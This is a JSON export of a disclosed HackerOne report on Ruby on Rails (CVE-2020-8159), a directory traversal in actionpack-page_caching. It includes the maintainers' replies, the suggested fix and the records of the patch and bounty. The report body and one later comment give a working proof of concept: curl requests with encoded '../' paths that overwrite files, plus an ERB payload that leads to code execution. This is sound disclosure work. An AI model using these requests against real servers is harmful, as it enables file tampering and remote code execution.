@@ -1,0 +1,541 @@
+{
+  "id": 519220,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTkyMjA=",
+  "url": "https://hackerone.com/reports/519220",
+  "title": "File writing by Directory traversal at actionpack-page_caching and RCE by it",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-03-31T07:25:13.608Z",
+  "submitted_at": "2019-03-31T07:25:13.608Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8159"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-07-13T02:45:21.644Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-06-13T02:45:20.847Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I found a directory traversal in `actionpack-page_caching`.\nSome code may lead to RCE.\n\n\nhttps://github.com/rails/actionpack-page_caching/blob/master/lib/action_controller/caching/pages.rb#L143\n\n```ruby\n  def cache_file(path, extension)\n    if path.empty? || path =~ %r{\\A/+\\z}\n      name = \"/index\"\n    else\n      name = URI.parser.unescape(path.chomp(\"/\"))\n    end\n\n    if File.extname(name).empty?\n      name + (extension || default_extension)\n    else\n      name\n    end\n  end\n\n  def cache_path(path, extension = nil)\n    File.join(cache_directory, cache_file(path, extension))\n  end\n```\n\nThe problem is that traversal is not considered in cache_path or cache_file.\nSince the URL can use `.` or` / `encoded values, the cache will be written in an unexpected place.\n\n### PoC\n\n#### step 1. Prepare server\n\n```log\nruby -v\n\nrails -v\n\nrails new caching_traversal\n\ncd caching_traversal\n\n# add `gem \"actionpack-page_caching\"` in Gemfile\n\nbundle install\n\nrails generate scaffold book name:string\nrails db:migrate\n```\n\n#### step 2. Setting cache\n\nEnable caching.\n\n```log\nrails dev:cache\n```\n\nAdd `caches_page`.\n\n```ruby\n# app/controllers/books_contorller.rb\nclass BooksController < ApplicationController\n  before_action :set_book, only: [:show, :edit, :update, :destroy]\n\n  caches_page :show\n```\n\n#### step 3. Start server\n\nStart the server with \"rails s\".\n\nPrepare a book with the following name.\n\n```\n<% `toouch me` %>\n```\n\n\nCheck cache behavior.\n\n```log\n❯ curl \"http://localhost:3000/books/1\"\n<!DOCTYPE html>\n...\n<p>\n  <strong>Name:</strong>\n  &lt;% `touch me` %&gt;\n</p>\n...\n\n❯ ls public\n404.html  500.html                          apple-touch-icon.png  favicon.ico\n422.html  apple-touch-icon-precomposed.png  books                 robots.txt\n\n❯ cat public/books/1.html\n<!DOCTYPE html>\n...\n<p>\n  <strong>Name:</strong>\n  &lt;% `touch me` %&gt;\n</p>\n...\n\n```\n\n\n#### step 4. Attack \n\nAdd an attack code to the pass and check the result.\n\n```log\n❯ curl \"http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest\"\n\n# test file is generated\n❯ ls\napp  config     db       Gemfile.lock  log           public    README.md  test       tmp\nbin  config.ru  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor\n\n\n❯ curl \"http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd\"\n\n# If the file exists it will be overwritten\n❯ cat README.md\n...\n<p>\n  <strong>Name:</strong>\n  &lt;% `touch me` %&gt;\n</p>\n...\n```\n\n#### step 5. RCE\n\nRCE is possible if it is possible to create a cache where the value of `<%` is not escaped, like render for text.\n\nGenerate the file `app/views/books/show.text.erb` as follows:\n\n\n```\nname: <%= @ book.name %>\n```\n\nOverwriting erb files enables RCE.\n\n```log\n# overwrite erb\n❯ curl \"http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text\"\nname: <% `touch me` %>\n\n❯ cat app/views/books/show.text.erb\nname: <% `touch me` %>\n\n\n# executed `touch me`\n❯ curl \"http://localhost:3000/books/1.txt\"\nname:\n\n# me file is generated\n❯ ls\napp  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor\nbin  config.ru  Gemfile  lib           me   public        README.md  test     tmp\n```\n\n## Impact\n\nThe cache is generated on an unintended path. Also, RCE may be possible.",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2020-07-13T02:45:20.916Z",
+  "allow_singular_disclosure_after": -100845266.98187558,
+  "singular_disclosure_allowed": true,
+  "vote_count": 79,
+  "voters": [
+    "lowk3v",
+    "p0ny",
+    "xploiterr",
+    "badcracker",
+    "mainteemoforfun",
+    "rook1337",
+    "bibekshah",
+    "holme",
+    "tess",
+    "renekroka",
+    "and 69 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 4428104,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Ughh, nice find!\n\nLooks like this was introduced in https://github.com/rails/rails/commit/d4576673c0c8d39f89e9798ab89b2c475a9f5f85, to fix https://web.archive.org/web/20070303040451/http://dev.rubyonrails.org:80/ticket/1877, care of https://web.archive.org/web/20051112005838/http://typo.leetsoft.com/trac/ticket/249.\n\n> There may be security implications if the encoded URL contains url-encoded ../../../..-type things. I suspect (but have not tested) that the web server will block most, if not all, of these.\n\n😬😬😬",
+      "automated_response": false,
+      "created_at": "2019-03-31T09:28:02.995Z",
+      "updated_at": "2019-03-31T09:28:02.995Z",
+      "actor": {
+        "username": "matthewd",
+        "cleared": false,
+        "verified": false,
+        "url": "/matthewd",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/011/558/5df350e99e2e86f74de4e3bf90de8880ac877b25_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 4944620,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@matthewd Any updates?",
+      "automated_response": false,
+      "created_at": "2019-05-28T23:12:57.873Z",
+      "updated_at": "2019-05-28T23:12:57.873Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 5048514,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@rails Any updates?",
+      "automated_response": false,
+      "created_at": "2019-06-11T12:19:17.281Z",
+      "updated_at": "2019-06-11T12:19:17.281Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 5691198,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@rails Any updates?",
+      "automated_response": false,
+      "created_at": "2019-08-29T13:31:26.468Z",
+      "updated_at": "2019-08-29T13:31:26.468Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 5756688,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Suggestion for correction.\n\n```\n--- a/lib/action_controller/caching/pages.rb\n+++ b/lib/action_controller/caching/pages.rb\n@@ -145,6 +145,7 @@ module ActionController\n               name = \"/index\"\n             else\n               name = URI.parser.unescape(path.chomp(\"/\"))\n+              name = Rack::Utils::clean_path_info(name)\n             end\n\n             if File.extname(name).empty?\n```\n",
+      "automated_response": false,
+      "created_at": "2019-09-08T14:13:12.361Z",
+      "updated_at": "2019-09-08T14:13:12.361Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 6080786,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@matthewd @rails\nHow about the above correction?",
+      "automated_response": false,
+      "created_at": "2019-10-19T13:20:13.324Z",
+      "updated_at": "2019-10-19T13:20:13.324Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 6657720,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @ooooooo_q\n\nThank you for your heavy patience on this report. I have asked the internal team about this and will get back to you one we have an update.\n\nWe apologize for the lack of information to you. \n@chinch1lla ",
+      "automated_response": false,
+      "created_at": "2019-12-30T10:44:02.241Z",
+      "updated_at": "2019-12-30T10:44:02.241Z",
+      "actor": {
+        "username": "h1_analyst_chanel",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_chanel",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8lc12r75cd2l5vipm7ll4faeiwj5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 7710662,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@chinch1lla \nAny updates? Or should I make an issue on Github?",
+      "automated_response": false,
+      "created_at": "2020-04-19T07:42:52.841Z",
+      "updated_at": "2020-04-19T07:42:52.841Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 7732297,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I asked for an update. Let's see if they respond.\n\nThanks and regards,\n@golden__retriever",
+      "automated_response": false,
+      "created_at": "2020-04-21T02:23:24.798Z",
+      "updated_at": "2020-04-21T02:23:24.798Z",
+      "actor": {
+        "username": "h1_analyst_jack",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_jack",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5d4phbudhwsbz0afcaaj9ziib4d4/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 7914985,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-05-06T16:46:40.838Z",
+      "updated_at": "2020-05-06T16:46:40.838Z",
+      "cve_ids": [
+        "CVE-2020-8159"
+      ],
+      "actor": {
+        "username": "tenderlove",
+        "cleared": false,
+        "verified": false,
+        "url": "/tenderlove",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 7915013,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi, thanks.  We've shipped a fix for this in version 1.2.1 of actionpack_page-caching",
+      "automated_response": false,
+      "created_at": "2020-05-06T16:49:00.561Z",
+      "updated_at": "2020-05-06T16:49:00.561Z",
+      "actor": {
+        "username": "tenderlove",
+        "cleared": false,
+        "verified": false,
+        "url": "/tenderlove",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "ooooooo_q",
+        "url": "/ooooooo_q"
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 8025246,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tenderlove \nhello,\nI confirmed it was fixed in 1.2.2.\n\nIs it possible to upgrade the version at rails-contributors?\nhttps://github.com/rails/rails-contributors/blob/master/Gemfile.lock#L28\n\nAfter confirming that it has been applied, I request a disclose for this report.\n",
+      "automated_response": false,
+      "created_at": "2020-05-17T06:16:55.440Z",
+      "updated_at": "2020-05-17T06:16:55.440Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 8219829,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I found another attack pattern on https://github.com/rails/rails-contributors\n\nFor paths where `(.format)` is supported, it was possible to embed an attack in the format with `..` as `%2e%2e` as follows:\n\n```\ncurl \"http://localhost:3000/faq.%2f%2e%2e%2f%2e%2e%2ftest\"\n-> test file is generated in root\n```",
+      "automated_response": false,
+      "created_at": "2020-06-06T11:54:33.519Z",
+      "updated_at": "2020-06-06T11:54:33.519Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 8279881,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "[rails-contributors fixed](https://github.com/rails/rails-contributors/commit/837c105f2c28e9322ebbe799c17f86837282306f)",
+      "automated_response": false,
+      "created_at": "2020-06-13T02:45:20.874Z",
+      "updated_at": "2020-06-13T02:45:20.874Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 8576235,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-07-13T02:45:21.723Z",
+      "updated_at": "2020-07-13T02:45:21.723Z",
+      "actor": {
+        "url": "/rails",
+        "ibb": true,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Ruby on Rails"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 9625572,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tenderlove \nIs this report within the scope of Rails bounty?",
+      "automated_response": false,
+      "created_at": "2020-10-24T22:49:48.952Z",
+      "updated_at": "2020-10-24T22:49:48.952Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 10159659,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-12-20T23:57:51.706Z",
+      "updated_at": "2020-12-20T23:57:51.706Z",
+      "actor": {
+        "url": "/rails",
+        "ibb": true,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Ruby on Rails"
+        }
+      },
+      "bounty_amount": "1000.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "rails",
+      "collaborator": {
+        "username": "ooooooo_q",
+        "url": "/ooooooo_q"
+      }
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
